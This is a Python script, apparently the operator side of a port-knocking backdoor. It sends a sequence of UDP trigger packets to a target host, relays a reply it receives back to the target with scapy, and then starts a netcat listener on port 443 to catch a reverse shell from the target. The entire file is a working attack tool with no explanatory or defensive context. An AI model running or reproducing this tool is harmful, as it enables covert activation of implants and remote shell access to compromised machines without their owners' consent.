import socket
from scapy.all import *
import os
import subprocess
import sys

dest_ip = sys.argv[1]
#dest_ip = "127.0.0.1"
dest_port1 = 40296
dest_port2 = 29640
dest_port3 = 64920
listen_ip = "0.0.0.0"
listen_port = 46290


def listen():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((listen_ip, listen_port))
    print(f'Listener started on {listen_ip}:{listen_port}...')
    i = 0
    while i < 1:
        data, addr = sock.recvfrom(4096)
        message = data.decode('utf-8')
        print(f"Received packet from {addr}: {message}")
        i = i + 1
    sock.close()
    return message


def send_trigger1():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = "empty"
    try:
        sock.sendto(message.encode(), (dest_ip, dest_port1))
        print(f"Sending first trigger packet to {dest_ip} on port {dest_port1}")
    finally:
        sock.close()


def send_trigger2():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = "empty"
    try:
        sock.sendto(message.encode(), (dest_ip, dest_port2))
        print(f"Sending second trigger packet to {dest_ip} on port {dest_port2}")
    finally:
        sock.close()


def send_trigger3(message):
    pkt = IP(dst=dest_ip)/UDP(dport=dest_port3)/message
    #sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #print(message)
    #pkt.show()
    try:
        send(pkt)
        #sock.sendto(message.encode(), (dest_ip, dest_port3))
        print(f"Sending last trigger packet to {dest_ip} on port {dest_port3}")
    finally:
        #sock.close()
        print("All triggers sent...\n")
        

def catch_shell():
	print("Setting up handler to catch callback...\n")
	subprocess.run(["nc", "-nlvp", "443"]) 


def main():
    print("Beginning trigger sequence...\n")
    try:
    	send_trigger1()
    	send_trigger2()
    	message = listen()
    	send_trigger3(message)
    	catch_shell()
    except KeyboardInterrupt:
        print('')
    
    exit(0)

if __name__ == "__main__":
    main()
